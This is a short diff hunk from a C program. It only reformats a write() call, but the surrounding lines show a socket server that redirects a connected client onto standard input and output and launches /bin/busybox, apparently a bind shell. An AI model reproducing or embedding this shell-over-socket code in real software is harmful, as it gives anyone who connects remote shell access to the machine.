@@ -31,7 +31,7 @@ int main() {
     	clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
         server_pid = fork(); 
         if (server_pid) { 
-        	write(clientfd , banner , strlen(banner));
+        	write(clientfd, banner,  strlen(banner));
 	        for(; i <3 /*u*/; i++) dup2(clientfd, i);
 	        execve("/bin/busybox", args, (char *) 0);
 	        close(clientfd); 
